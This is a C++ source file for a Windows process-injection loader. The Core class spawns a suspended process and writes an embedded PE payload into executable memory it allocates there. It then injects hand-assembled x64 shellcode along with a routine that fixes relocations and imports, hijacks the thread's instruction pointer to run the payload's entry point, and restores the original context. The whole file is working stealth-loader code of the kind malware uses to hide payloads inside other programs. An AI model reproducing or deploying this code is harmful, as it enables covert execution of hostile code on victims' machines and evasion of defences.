#include "core.h"
#include "config.h"
#include "logger.h"
#include "payload.h"

#define SHELLCODE_MAGIC 0xDEADBEEF
#define COMPLETION_FLAG_VALUE 0xD1EAF1F1

namespace mrk {
	struct ShellcodeParams {
		// SHELLCODE_MAGIC
		uint32_t magic;

		decltype(&LoadLibraryA) pLoadLibraryA;
		decltype(&GetProcAddress) pGetProcAddress;
		decltype(&MessageBoxA) pMessageBoxA;

		// Module base
		void* moduleBase;
	};

	// 0xAAAAAAAAAAAAAAAA -> fixupShellcode address
	// 0xCCCCCCCCCCCCCCCC -> params address
	// 0xDDDDDDDDDDDDDDDD -> return code address
	// 0xEEEEEEEEEEEEEEEE -> completion flag address
	uint8_t loaderShellcode[] = {
		// Align stack
		0x48, 0xB8, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,		// mov    rax, -16
		0x48, 0x21, 0xC4,												// and    rsp, rax

		// Allocate shadow space
		0x48, 0x83, 0xEC, 0x20,											// sub    rsp, 0x20

		// Load parameters
		0x48, 0xB9, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,		// mov	  rcx, 0xcccccccccccccccc
		0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,		// mov    rax, 0xaaaaaaaaaaaaaaaa
		0xFF, 0xD0,														// call   rax

		// Store return code
		0x49, 0xBA, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,		// mov    r10, 0xdddddddddddddddd
		0x41, 0x89, 0x02,												// mov    DWORD PTR [r10], eax

		// Mark completed
		0x49, 0xBB, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE, 0xEE,		// mov    r11, 0xeeeeeeeeeeeeeeee
		0x41, 0xC7, 0x03, 0xF1, 0xF1, 0xEA, 0xD1,						// mov    DWORD PTR [r11], 0xD1EAF1F1 // COMPLETION_FLAG_VALUE

		// Clean up stack
		0x48, 0x83, 0xC4, 0x20,											// add    rsp, 0x20

		// Infinite loop
		0xEB, 0xFE														// jmp    -2
	};

	DWORD __stdcall fixupShellcode(void* rawParams);

	Core::Core(LoaderConfig* config) : config_(config), payloadData_(payloadData), 
		procHandle_(nullptr), thHandle_(nullptr), payloadDosHeader_(nullptr), payloadNtHeaders_(nullptr),
		fixupShellcodeSetup_({}), loaderShellcodeSetup_({}) {}

	Core::~Core() {
		cleanup();
	}

	void Core::cleanup() {
		if (procHandle_) {
			CloseHandle(procHandle_);
			procHandle_ = nullptr;
		}

		if (thHandle_) {
			CloseHandle(thHandle_);
			thHandle_ = nullptr;
		}
	}

	bool Core::execute() {
		if (!config_) return false;

		if (!createSuspendedProcess()) {
			LOG("Failed to create suspended process.");
			return false;
		}

		if (!validatePayloadHeaders()) {
			LOG("Payload validation failed.");
			return false;
		}

		if (!allocateAndCopyPayload()) {
			LOG("Failed to allocate and copy payload.");
			return false;
		}

		if (!injectFixupShellcode()) {
			LOG("Failed to inject fixup shellcode.");
			return false;
		}

		if (!injectLoaderShellcode()) {
			LOG("Failed to inject loader shellcode.");
			return false;
		}

		if (!executeLoaderShellcode()) {
			LOG("Failed to execute loader shellcode.");
			return false;
		}

		return true;
	}

	bool Core::createSuspendedProcess() {
		STARTUPINFOA si;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);

		PROCESS_INFORMATION pi;
		ZeroMemory(&pi, sizeof(pi));

		if (!CreateProcessA(
			config_->processPath,
			nullptr,
			nullptr,
			nullptr,
			FALSE,
			CREATE_SUSPENDED,
			nullptr,
			nullptr,
			&si,
			&pi
		)) {
			LOG("Failed to create process. Error: %lu", GetLastError());
			return false;
		}

		procHandle_ = pi.hProcess;
		thHandle_ = pi.hThread;

		return true;
	}

	bool Core::validatePayloadHeaders() {
		payloadDosHeader_ = reinterpret_cast<PIMAGE_DOS_HEADER>(payloadData_);
		if (payloadDosHeader_->e_magic != IMAGE_DOS_SIGNATURE) {
			LOG("Invalid payload: Incorrect DOS signature.");
			return false;
		}

		payloadNtHeaders_ = reinterpret_cast<PIMAGE_NT_HEADERS>(payloadData_ + payloadDosHeader_->e_lfanew);
		if (payloadNtHeaders_->Signature != IMAGE_NT_SIGNATURE) {
			LOG("Invalid payload: Incorrect NT signature.");
			return false;
		}

		return true;
	}

	bool Core::allocateAndCopyPayload() {
		DWORD payloadSize = payloadNtHeaders_->OptionalHeader.SizeOfImage;
		LOG("Allocating payload memory of size: %lu", payloadSize);

		void* allocationBase = VirtualAllocEx(
			procHandle_,
			nullptr,
			payloadSize,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);

		if (!allocationBase) {
			LOG("Failed to allocate memory in target process. Error: %lu", GetLastError());
			return false;
		}

		// Copy headers
		LOG("Copying payload headers...");

		if (!WriteProcessMemory(
			procHandle_,
			allocationBase,
			payloadData_,
			payloadNtHeaders_->OptionalHeader.SizeOfHeaders,
			nullptr
		)) {
			LOG("Failed to write payload headers. Error: %lu", GetLastError());
			VirtualFreeEx(procHandle_, allocationBase, 0, MEM_RELEASE);
			return false;
		}

		// Copy sections
		LOG("Copying payload sections...");
		
		PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(payloadNtHeaders_);
		for (WORD i = 0; i < payloadNtHeaders_->FileHeader.NumberOfSections; i++) {
			LOG("Copying section %.*s...", IMAGE_SIZEOF_SHORT_NAME, sectionHeader[i].Name);
			
			void* destAddress = reinterpret_cast<void*>(
				reinterpret_cast<uintptr_t>(allocationBase) + sectionHeader[i].VirtualAddress);
			void* srcAddress = reinterpret_cast<void*>(
				reinterpret_cast<uintptr_t>(payloadData_) + sectionHeader[i].PointerToRawData);

			if (!WriteProcessMemory(
				procHandle_,
				destAddress,
				srcAddress,
				sectionHeader[i].SizeOfRawData,
				nullptr
			)) {
				LOG("Failed to write section %.*s. Error: %lu", IMAGE_SIZEOF_SHORT_NAME, sectionHeader[i].Name, GetLastError());
				VirtualFreeEx(procHandle_, allocationBase, 0, MEM_RELEASE);
				return false;
			}
		}

		fixupShellcodeSetup_.moduleBase = allocationBase;
		return true;
	}

	bool Core::injectFixupShellcode() {
		// Allocate fixupShellcode params
		ShellcodeParams params;
		params.magic = SHELLCODE_MAGIC;
		params.pLoadLibraryA = LoadLibraryA;
		params.pGetProcAddress = GetProcAddress;
		params.pMessageBoxA = MessageBoxA;
		params.moduleBase = fixupShellcodeSetup_.moduleBase;
		
		void* paramsBase = VirtualAllocEx(
			procHandle_,
			nullptr,
			sizeof(ShellcodeParams),
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);

		if (!paramsBase) {
			LOG("Failed to allocate memory for fixupShellcode params. Error: %lu", GetLastError());
			return false;
		}

		// Write fixupShellcode params
		if (!WriteProcessMemory(procHandle_, paramsBase, &params, sizeof(ShellcodeParams), nullptr)) {
			LOG("Failed to write fixupShellcode params. Error: %lu", GetLastError());
			VirtualFreeEx(procHandle_, paramsBase, 0, MEM_RELEASE);
			return false;
		}

		// Allocate fixupShellcode
		void* shellcodeBase = VirtualAllocEx(
			procHandle_,
			nullptr,
			0x1000,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
		);

		if (!shellcodeBase) {
			LOG("Failed to allocate memory for fixupShellcode. Error: %lu", GetLastError());
			VirtualFreeEx(procHandle_, paramsBase, 0, MEM_RELEASE);
			return false;
		}

		LOG("Allocated fixup shellcode at 0x%p", shellcodeBase);

		// Write fixupShellcode
		if (!WriteProcessMemory(procHandle_, shellcodeBase, fixupShellcode, 0x1000, nullptr)) {
			LOG("Failed to write fixupShellcode. Error: %lu", GetLastError());
			VirtualFreeEx(procHandle_, paramsBase, 0, MEM_RELEASE);
			VirtualFreeEx(procHandle_, shellcodeBase, 0, MEM_RELEASE);
			return false;
		}

		fixupShellcodeSetup_.paramsBase = paramsBase;
		fixupShellcodeSetup_.shellcodeBase = shellcodeBase;

		return true;
	}

	bool Core::injectLoaderShellcode() {
		// Allocate return code and completion flag
		void* returnCodeBase = VirtualAllocEx(
			procHandle_,
			nullptr,
			sizeof(DWORD),
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE
		);

		if (!returnCodeBase) {
			LOG("Failed to allocate memory for return code. Error: %lu", GetLastError());
			return false;
		}

		// Write initial return code
		DWORD initialReturnCode = (DWORD)-1;
		if (!WriteProcessMemory(procHandle_, returnCodeBase, &initialReturnCode, sizeof(DWORD), nullptr)) {
			LOG("Failed to write initial return code. Error: %lu", GetLastError());
			VirtualFreeEx(procHandle_, returnCodeBase, 0, MEM_RELEASE);
			return false;
		}

		void* completionFlagBase = VirtualAllocEx(
			procHandle_,
			nullptr,
			sizeof(DWORD),
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE
		);

		if (!completionFlagBase) {
			LOG("Failed to allocate memory for completion flag. Error: %lu", GetLastError());
			VirtualFreeEx(procHandle_, returnCodeBase, 0, MEM_RELEASE);
			return false;
		}

		// Patch addresses
		for (size_t i = 0; i < sizeof(loaderShellcode) - sizeof(uintptr_t); i++) {
			uintptr_t* ptr = reinterpret_cast<uintptr_t*>((loaderShellcode + i));
			switch (*ptr) {
				case 0xAAAAAAAAAAAAAAAA:
					*ptr = (uintptr_t)fixupShellcodeSetup_.shellcodeBase;
					LOG("Set fixup shellcode address: 0x%llX", static_cast<unsigned long long>(*ptr));
					break;

				case 0xCCCCCCCCCCCCCCCC:
					*ptr = (uintptr_t)fixupShellcodeSetup_.paramsBase;
					LOG("Set params address: 0x%llX", static_cast<unsigned long long>(*ptr));
					break;

				case 0xDDDDDDDDDDDDDDDD:
					*ptr = (uintptr_t)returnCodeBase;
					LOG("Set return code address: 0x%llX", static_cast<unsigned long long>(*ptr));
					break;

				case 0xEEEEEEEEEEEEEEEE:
					*ptr = (uintptr_t)completionFlagBase;
					LOG("Set completion flag address: 0x%llX", static_cast<unsigned long long>(*ptr));
					break;
			}
		}

		// Allocate loader shellcode
		void* shellcodeBase = VirtualAllocEx(
			procHandle_,
			nullptr,
			sizeof(loaderShellcode),
			MEM_RESERVE | MEM_COMMIT,
			PAGE_EXECUTE_READWRITE
		);

		if (!shellcodeBase) {
			LOG("Failed to allocate memory for loadShellcode. Error: %lu", GetLastError());
			return false;
		}

		LOG("Allocated loader shellcode at 0x%p", shellcodeBase);

		// Write shellcode
		if (!WriteProcessMemory(procHandle_, shellcodeBase, loaderShellcode, sizeof(loaderShellcode), nullptr)) {
			LOG("Failed to write loaderShellcode. Error: %lu", GetLastError());
			VirtualFreeEx(procHandle_, shellcodeBase, 0, MEM_RELEASE);
			VirtualFreeEx(procHandle_, returnCodeBase, 0, MEM_RELEASE);
			VirtualFreeEx(procHandle_, completionFlagBase, 0, MEM_RELEASE);
			return false;
		}

		loaderShellcodeSetup_.shellcodeBase = shellcodeBase;
		loaderShellcodeSetup_.returnCodeBase = returnCodeBase;
		loaderShellcodeSetup_.completionFlagBase = completionFlagBase;

		return true;
	}

	bool Core::executeLoaderShellcode() {
		// Hijack em all

		CONTEXT context;
		ZeroMemory(&context, sizeof(context));
		context.ContextFlags = CONTEXT_FULL;

		if (!GetThreadContext(thHandle_, &context)) {
			LOG("Failed to get thread context. Error: %lu", GetLastError());
			return false;
		}

		// Backup context
		CONTEXT oldContext = context;

		// RIP -> loaderShellcode
		context.Rip = reinterpret_cast<uintptr_t>(loaderShellcodeSetup_.shellcodeBase);
		
		LOG("Hijacking thread context...");
		if (!SetThreadContext(thHandle_, &context)) {
			LOG("Failed to set thread context. Error: %lu", GetLastError());
			return false;
		}

		ResumeThread(thHandle_);

		// Wait for completion
		LOG("Waiting for loader shellcode to complete...");

		DWORD completionFlag = 0;
		do {
			Sleep(100);
		} while (ReadProcessMemory(
			procHandle_,
			loaderShellcodeSetup_.completionFlagBase,
			&completionFlag,
			sizeof(DWORD),
			nullptr
		) && completionFlag != COMPLETION_FLAG_VALUE);

		// RPM failed?
		if (completionFlag != COMPLETION_FLAG_VALUE) {
			LOG("Loader shellcode did not complete successfully.");
			return false;
		}

		// Read return code
		DWORD returnCode = 0;
		if (!ReadProcessMemory(
			procHandle_,
			loaderShellcodeSetup_.returnCodeBase,
			&returnCode,
			sizeof(DWORD),
			nullptr
		)) {
			LOG("Failed to read loader shellcode return code. Error: %lu", GetLastError());
			return false;
		}

		LOG("Loader shellcode returned: 0x%X", returnCode);
		if (returnCode != 0) {
			LOG("Loader shellcode reported failure.");
			return false;
		}

		// Restore old context
		LOG("Restoring old context...");
		SuspendThread(thHandle_);
		if (!SetThreadContext(thHandle_, &oldContext)) {
			LOG("Failed to set thread context. Error: %lu", GetLastError());
			return false;
		}

		ResumeThread(thHandle_);
		return true;
	}

	DWORD __stdcall fixupShellcode(void* rawParams) {
		ShellcodeParams* params = reinterpret_cast<ShellcodeParams*>(rawParams);
		if (params->magic != SHELLCODE_MAGIC) {
			return 1;
		}

		// Fix relocations
		uintptr_t baseAddress = reinterpret_cast<uintptr_t>(params->moduleBase);
		PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(baseAddress);
		PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(baseAddress + dosHeader->e_lfanew);

		uintptr_t delta = baseAddress - ntHeaders->OptionalHeader.ImageBase;
		if (delta != 0) {
			PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
			if (relocDir->Size == 0) {
				return 2; // No relocations present
			}

			uintptr_t relocBase = baseAddress + relocDir->VirtualAddress;
			uintptr_t relocEnd = relocBase + relocDir->Size;
			while (relocBase < relocEnd) {
				PIMAGE_BASE_RELOCATION relocBlock = reinterpret_cast<PIMAGE_BASE_RELOCATION>(relocBase);
				uintptr_t relocBlockBase = baseAddress + relocBlock->VirtualAddress;
				
				WORD* relocEntries = reinterpret_cast<WORD*>(relocBlock + 1);
				DWORD entryCount = (relocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

				for (DWORD i = 0; i < entryCount; i++) {
					WORD entry = relocEntries[i];
					WORD type = entry >> 12;
					WORD offset = entry & 0x0FFF;

					if (type == IMAGE_REL_BASED_DIR64) {
						uintptr_t* patchAddress = reinterpret_cast<uintptr_t*>(relocBlockBase + offset);
						*patchAddress += delta;
					}
				}

				relocBase += relocBlock->SizeOfBlock;
			}
		}

		// Fix imports
		PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
		if (importDir->Size > 0) {
			PIMAGE_IMPORT_DESCRIPTOR importDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(baseAddress + importDir->VirtualAddress);
			while (importDesc->Characteristics) {
				char* dllName = reinterpret_cast<char*>(baseAddress + importDesc->Name);
				HMODULE hModule = params->pLoadLibraryA(dllName);
				if (!hModule) {
					return 3; // Failed to load module
				}

				PIMAGE_THUNK_DATA thunkRef = reinterpret_cast<PIMAGE_THUNK_DATA>(baseAddress + importDesc->OriginalFirstThunk);
				PIMAGE_THUNK_DATA funcRef = reinterpret_cast<PIMAGE_THUNK_DATA>(baseAddress + importDesc->FirstThunk);
				while (thunkRef->u1.AddressOfData) {
					if (thunkRef->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
						// Import by ordinal
						uint16_t ordinal = static_cast<uint16_t>(thunkRef->u1.Ordinal & 0xFFFF);
						uintptr_t funcAddress = reinterpret_cast<uintptr_t>(params->pGetProcAddress(hModule, MAKEINTRESOURCE(ordinal)));
						if (!funcAddress) {
							return 4; // Failed to get proc address by ordinal
						}

						funcRef->u1.Function = funcAddress;
					}
					else {
						// Import by name
						PIMAGE_IMPORT_BY_NAME importByName = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(baseAddress + thunkRef->u1.AddressOfData);
						char* functionName = reinterpret_cast<char*>(importByName->Name);
						uintptr_t funcAddress = reinterpret_cast<uintptr_t>(params->pGetProcAddress(hModule, functionName));
						if (!funcAddress) {
							return 5; // Failed to get proc address by name
						}

						funcRef->u1.Function = funcAddress;
					}

					thunkRef++;
					funcRef++;
				}

				importDesc++;
			}
		}

		// Execute TLS callbacks if any
		typedef void(__stdcall* DLL_CALLBACK)(void*, DWORD, void*);
		PIMAGE_DATA_DIRECTORY tlsDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
		if (tlsDir->Size > 0) {
			PIMAGE_TLS_DIRECTORY tlsDirectory = reinterpret_cast<PIMAGE_TLS_DIRECTORY>(baseAddress + tlsDir->VirtualAddress);
			uintptr_t* callback = reinterpret_cast<uintptr_t*>(tlsDirectory->AddressOfCallBacks);
			while (*callback) {
				DLL_CALLBACK tlsCallback = reinterpret_cast<DLL_CALLBACK>(*callback);
				tlsCallback(reinterpret_cast<void*>(baseAddress), DLL_PROCESS_ATTACH, nullptr);
				callback++;
			}
		}

		// Call entry point
		DLL_CALLBACK entryPoint = reinterpret_cast<DLL_CALLBACK>(
			baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint);
		if (!entryPoint) {
			return 6; // No entry point
		}

		entryPoint(reinterpret_cast<void*>(baseAddress), DLL_PROCESS_ATTACH, nullptr);
		return 0;
	}
}